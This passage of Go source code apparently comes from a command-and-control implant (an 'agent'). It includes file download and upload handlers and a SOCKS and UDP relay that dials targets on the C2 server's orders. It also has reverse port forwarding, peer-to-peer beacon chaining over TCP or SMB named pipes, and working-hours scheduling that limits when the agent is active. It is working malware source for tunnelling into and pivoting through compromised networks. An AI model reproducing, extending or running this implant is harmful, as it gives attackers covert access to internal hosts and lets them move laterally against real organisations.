		return nil, fmt.Errorf("read chunk failed: %w", err)
	}
	return buf[:n], nil
}

// uploadFileChunk writes base64 chunk at offset
func uploadFileChunk(path string, offset int64, b64Content string) error {
	data, err := base64.StdEncoding.DecodeString(b64Content)
	if err != nil {
		return fmt.Errorf("base64 decode failed: %w", err)
	}
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("open file for write failed: %w", err)
	}
	defer f.Close()
	if offset > 0 {
		if _, err := f.Seek(offset, 0); err != nil {
			return err
		}
	}
	_, err = f.Write(data)
	return err
}

// downloadFromURL downloads a file from HTTP URL to dest path on disk
func downloadFromURL(urlStr, destPath string) error {
	if destPath == "" {
		return fmt.Errorf("destination path required")
	}
	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("http status %d", resp.StatusCode)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	return os.WriteFile(destPath, data, 0644)
}

// ???????????????????????????????????????????????????????????????????????????????
// SOCKS RELAY SUBSYSTEM (Agent Side)
// Receives relay frames from C2 server via Beacon, dials actual targets,
// and ferries data bidirectionally.
// ???????????????????????????????????????????????????????????????????????????????

func socksProcessFrames(frames []socksFrame) {
	for _, f := range frames {
		switch f.Action {
		case "connect":
			go socksHandleConnect(f.ConnID, string(f.Data))
		case "data":
			socksHandleData(f.ConnID, f.Data)
		case "close":
			socksHandleClose(f.ConnID)
		case "rportfwd_connect":
			go rportfwdDial(f.ConnID, string(f.Data))
		case "rportfwd_data":
			rportfwdWrite(f.ConnID, f.Data)
		case "rportfwd_close":
			rportfwdClose(f.ConnID)
		case "tunnel_add":
			tunnelAddRouteFromFrame(string(f.Data))
		case "tunnel_remove":
			tunnelRemoveRouteFromFrame(string(f.Data))

		// UDP ASSOCIATE
		case "udp_associate":
			go socksHandleUDPAssociate(f.ConnID)
		case "udp_data":
			socksHandleUDPData(f.ConnID, f.Data)
		}
	}
}

func socksHandleConnect(connID uint64, destAddr string) {
	conn, err := net.DialTimeout("tcp", destAddr, 10*time.Second)
	if err != nil {
		if Debug {
			fmt.Printf("[socks] connect %s failed: %v\n", destAddr, err)
		}
		// Send close to orphan buffer ? server will close operator TCP on receipt.
		// Always enqueue so operator connection doesn't hang.
		socksRelayMu.Lock()
		if len(socksOrphanOut) < socksOrphanMaxOut {
			socksOrphanOut = append(socksOrphanOut, socksFrame{ConnID: connID, Action: "close"})
		}
		socksRelayMu.Unlock()
		return
	}

	rc := &socksRelayConn{tcpConn: conn}
	socksRelayMu.Lock()
	socksRelayConns[connID] = rc
	socksRelayMu.Unlock()

	socksEnqueueOut(connID, "connected", nil)

	if Debug {
		fmt.Printf("[socks] connected to %s (conn %d)\n", destAddr, connID)
	}

	// Read from target ? buffer for server
	buf := make([]byte, 32*1024) // 32KB read chunks
	for {
		conn.SetReadDeadline(time.Now().Add(SocksReadTimeout))
		n, err := conn.Read(buf)
		if n > 0 {
			data := make([]byte, n)
			copy(data, buf[:n])
			socksEnqueueOut(connID, "data", data)
		}
		if err != nil {
			break
		}
	}

	// Target disconnected
	socksRelayMu.Lock()
	if rc2, ok := socksRelayConns[connID]; ok {
		rc2.mu.Lock()
		rc2.closed = true
		rc2.mu.Unlock()
		delete(socksRelayConns, connID)
	}
	socksRelayMu.Unlock()
	socksEnqueueOut(connID, "close", nil)

	if Debug {
		fmt.Printf("[socks] target %s disconnected (conn %d)\n", destAddr, connID)
	}
}

func socksHandleData(connID uint64, data []byte) {
	socksRelayMu.Lock()
	conn, ok := socksRelayConns[connID]
	socksRelayMu.Unlock()
	if !ok || len(data) == 0 {
		return
	}
	conn.mu.Lock()
	defer conn.mu.Unlock()
	if conn.closed {
		return
	}
	conn.tcpConn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.tcpConn.Write(data)
	conn.tcpConn.SetWriteDeadline(time.Time{})
}

func socksHandleClose(connID uint64) {
	socksRelayMu.Lock()
	conn, ok := socksRelayConns[connID]
	if ok {
		delete(socksRelayConns, connID)
	}
	socksRelayMu.Unlock()
	if ok {
		conn.mu.Lock()
		conn.closed = true
		conn.tcpConn.Close()
		conn.mu.Unlock()
	}

	// Also clean up UDP associations with the same ConnID
	udpRelayMu.Lock()
	uc, uok := udpRelayConns[connID]
	if uok {
		delete(udpRelayConns, connID)
	}
	udpRelayMu.Unlock()
	if uok {
		uc.mu.Lock()
		uc.closed = true
		uc.mu.Unlock()
		uc.udpConn.Close()
	}
}

// socksHandleUDPAssociate starts a local UDP listener on the agent for
// relaying UDP datagrams through the C2 tunnel for the given association.
func socksHandleUDPAssociate(connID uint64) {
	udpConn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
	if err != nil {
		if Debug {
			fmt.Printf("[socks] UDP ASSOCIATE listen failed: %v\n", err)
		}
		return
	}

	uc := &udpRelayConn{
		connID:  connID,
		udpConn: udpConn,
	}

	udpRelayMu.Lock()
	udpRelayConns[connID] = uc
	udpRelayMu.Unlock()

	if Debug {
		fmt.Printf("[socks] UDP ASSOCIATE started on port %d (conn %d)\n",
			udpConn.LocalAddr().(*net.UDPAddr).Port, connID)
	}

	// Read goroutine: captures response datagrams from any target and
	// sends them back to the server via the C2 tunnel.
	buf := make([]byte, 65535)
	go func() {
		defer func() {
			udpRelayMu.Lock()
			if existing, ok := udpRelayConns[connID]; ok && existing == uc {
				delete(udpRelayConns, connID)
			}
			udpRelayMu.Unlock()
			udpConn.Close()
		}()

		for {
			n, srcAddr, err := udpConn.ReadFromUDP(buf)
			if err != nil {
				return
			}

			payload := make([]byte, n)
			copy(payload, buf[:n])

			// Encode source address + payload and enqueue for server
			encoded := encodeUDPFrameData(srcAddr.IP.String(), srcAddr.Port, payload)
			socksEnqueueOut(connID, "udp_data", encoded)
		}
	}()
}

// socksHandleUDPData sends a UDP datagram to the target address specified in
// the frame data. The response (if any) is captured by the read goroutine
// started in socksHandleUDPAssociate.
func socksHandleUDPData(connID uint64, data []byte) {
	udpRelayMu.Lock()
	uc, ok := udpRelayConns[connID]
	udpRelayMu.Unlock()
	if !ok || len(data) == 0 {
		return
	}

	dstAddr, dstPort, payload, err := decodeUDPFrameData(data)
	if err != nil {
		if Debug {
			fmt.Printf("[socks] UDP data decode error: %v\n", err)
		}
		return
	}

	dstUDPAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", dstAddr, dstPort))
	if err != nil {
		if Debug {
			fmt.Printf("[socks] UDP resolve %s:%d failed: %v\n", dstAddr, dstPort, err)
		}
		return
	}

	uc.mu.Lock()
	defer uc.mu.Unlock()
	if uc.closed {
		return
	}

	if _, err := uc.udpConn.WriteTo(payload, dstUDPAddr); err != nil {
		if Debug {
			fmt.Printf("[socks] UDP write to %s:%d failed: %v\n", dstAddr, dstPort, err)
		}
	}
}

// ── UDP Frame Binary Encoding ───────────────────────────────────────────────

// encodeUDPFrameData encodes (addr, port, payload) into a binary blob for
// SocksFrame.Data. Format: addrLen(2) + addr(N) + port(2) + payload.
func encodeUDPFrameData(addr string, port int, payload []byte) []byte {
	addrBytes := []byte(addr)
	out := make([]byte, 2+len(addrBytes)+2+len(payload))
	binary.BigEndian.PutUint16(out[0:2], uint16(len(addrBytes)))
	copy(out[2:], addrBytes)
	binary.BigEndian.PutUint16(out[2+len(addrBytes):], uint16(port))
	copy(out[4+len(addrBytes):], payload)
	return out
}

// decodeUDPFrameData reverses encodeUDPFrameData.
func decodeUDPFrameData(data []byte) (addr string, port int, payload []byte, err error) {
	if len(data) < 4 {
		return "", 0, nil, fmt.Errorf("UDP frame data too short: %d bytes", len(data))
	}
	addrLen := int(binary.BigEndian.Uint16(data[0:2]))
	if len(data) < 2+addrLen+2 {
		return "", 0, nil, fmt.Errorf("UDP frame data truncated: need %d, have %d", 2+addrLen+2, len(data))
	}
	addr = string(data[2 : 2+addrLen])
	port = int(binary.BigEndian.Uint16(data[2+addrLen : 4+addrLen]))
	payload = data[4+addrLen:]
	return
}

func socksEnqueueOut(connID uint64, action string, data []byte) {
	frame := socksFrame{ConnID: connID, Action: action, Data: data}

	// Check TCP connections first
	socksRelayMu.Lock()
	conn, ok := socksRelayConns[connID]
	socksRelayMu.Unlock()

	if ok {
		conn.mu.Lock()
		conn.outbound = append(conn.outbound, frame)
		conn.mu.Unlock()
		return
	}

	// Check UDP associations for udp_data frames
	if action == "udp_data" {
		udpRelayMu.Lock()
		udpOrphanOut = append(udpOrphanOut, frame)
		if len(udpOrphanOut) > socksOrphanMaxOut {
			udpOrphanOut = udpOrphanOut[1:]
		}
		udpRelayMu.Unlock()
		return
	}

	// Connection not in map ? control frames (close/connected) go to orphan buffer
	if action != "close" && action != "connected" {
		return // drop data frames for unknown connections
	}
	socksRelayMu.Lock()
	if len(socksOrphanOut) >= socksOrphanMaxOut {
		// Drop oldest to prevent unbounded growth
		socksOrphanOut = socksOrphanOut[1:]
	}
	socksOrphanOut = append(socksOrphanOut, frame)
	socksRelayMu.Unlock()
}

// socksOrphanOut holds control frames for connections not in the map
var socksOrphanOut []socksFrame

// udpOrphanOut holds UDP data frames for UDP associations not tracked via TCP
var udpOrphanOut []socksFrame

// ?? P2P Beacon Chaining ????????????????????????????????????????????????????????????

// sendP2PBeacon sends beacon request to parent agent via TCP or Named Pipe
func sendP2PBeacon(body []byte) []byte {
	if strings.HasPrefix(P2PParent, "pipe://") {
		return sendP2PSMBBeacon(body)
	}
	return sendP2PTCPBeacon(body)
}

func sendP2PTCPBeacon(body []byte) []byte {
	addr := strings.TrimPrefix(P2PParent, "tcp://")
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P TCP dial to %s failed: %v\n", addr, err)
		}
		return nil
	}
	defer conn.Close()

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

// p2pParentListen accepts child agent connections in a loop
func p2pParentListen() {
	if P2PMode == "smb" {
		p2pListenSMB()
	} else if P2PMode == "tcp" {
		p2pListenTCP()
	}
}

func p2pListenTCP() {
	ln, err := net.Listen("tcp", P2PListenAddr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P TCP listen on %s failed: %v\n", P2PListenAddr, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}

func p2pHandleChild(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(60 * time.Second))

	// Read request length + body
	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return
	}
	body := make([]byte, rlen)
	if _, err := io.ReadFull(conn, body); err != nil {
		return
	}

	var req BeaconRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return
	}

	// Identify child by UUID
	childID := req.UUID
	if childID == "" {
		return
	}

	// Store relayed results
	p2pRelayMu.Lock()
	isNew := true
	for _, uuid := range p2pChildUUIDs {
		if uuid == childID {
			isNew = false
			break
		}
	}
	if isNew {
		p2pChildUUIDs = append(p2pChildUUIDs, childID)
	}
	p2pChildLastSeen[childID] = time.Now()
	if len(req.Results) > 0 {
		p2pChildResults[childID] = append(p2pChildResults[childID], req.Results...)
	}
	// Check if there are any pending tasks for this child
	tasksForChild := p2pChildTasks[childID]
	delete(p2pChildTasks, childID)
	p2pRelayMu.Unlock()

	// Build response with tasks for this child
	resp := BeaconResponse{
		Tasks: tasksForChild,
	}

	respBody, _ := json.Marshal(resp)

	// Write response back to child
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	binary.Write(conn, binary.BigEndian, uint32(len(respBody)))
	conn.Write(respBody)
}

// socksCollectOutbound gathers all pending relay data to send to server.
func socksCollectOutbound() []socksFrame {
	var frames []socksFrame

	// Collect orphan frames (connected/close for non-tracked conns)
	socksRelayMu.Lock()
	if len(socksOrphanOut) > 0 {
		frames = append(frames, socksOrphanOut...)
		socksOrphanOut = socksOrphanOut[:0]
	}
	socksRelayMu.Unlock()

	// Collect UDP orphan frames (udp_data for UDP associations)
	udpRelayMu.Lock()
	if len(udpOrphanOut) > 0 {
		frames = append(frames, udpOrphanOut...)
		udpOrphanOut = udpOrphanOut[:0]
	}
	udpRelayMu.Unlock()

	// Collect from active connections (direct struct copy, no marshal/unmarshal)
	socksRelayMu.Lock()
	for _, conn := range socksRelayConns {
		conn.mu.Lock()
		if len(conn.outbound) > 0 {
			frames = append(frames, conn.outbound...)
			conn.outbound = conn.outbound[:0]
		}
		conn.mu.Unlock()
	}
	socksRelayMu.Unlock()

	return frames
}

// isWithinWorkingHours checks if the current time is within the configured working hours window.
func isWithinWorkingHours() bool {
	now := time.Now()
	loc := loadWorkingTZ()
	local := now.In(loc)

	startTime, err := time.ParseInLocation("15:04", workingStart, loc)
	if err != nil {
		return true // malformed start, allow activity
	}
	endTime, err := time.ParseInLocation("15:04", workingEnd, loc)
	if err != nil {
		return true // malformed end, allow activity
	}

	currentMinutes := local.Hour()*60 + local.Minute()
	startMinutes := startTime.Hour()*60 + startTime.Minute()
	endMinutes := endTime.Hour()*60 + endTime.Minute()

	if startMinutes <= endMinutes {
		return currentMinutes >= startMinutes && currentMinutes < endMinutes
	}
	// Overnight window (e.g. 22:00-06:00)
	return currentMinutes >= startMinutes || currentMinutes < endMinutes
}

// timeUntilNextWindow returns how long to sleep until the next working window opens.
func timeUntilNextWindow() time.Duration {
	now := time.Now()
	loc := loadWorkingTZ()
	local := now.In(loc)

	startTime, err := time.ParseInLocation("15:04", workingStart, loc)
	if err != nil {
		return 5 * time.Minute // fallback
	}
	endTime, err := time.ParseInLocation("15:04", workingEnd, loc)
	if err != nil {
		return 5 * time.Minute
	}
	_ = endTime

	startMinutes := startTime.Hour()*60 + startTime.Minute()
	currentMinutes := local.Hour()*60 + local.Minute()

	// Calculate how many minutes until start
	var minutesUntilStart int
	if startMinutes > currentMinutes {
		minutesUntilStart = startMinutes - currentMinutes
	} else {
		minutesUntilStart = (24*60 - currentMinutes) + startMinutes
	}

	return time.Duration(minutesUntilStart) * time.Minute
}

// loadWorkingTZ loads the configured timezone or returns UTC.
func loadWorkingTZ() *time.Location {
	if workingTZ == "" {
		return time.UTC
	}
	loc, err := time.LoadLocation(workingTZ)
	if err != nil {
		return time.UTC
	}
	return loc
}
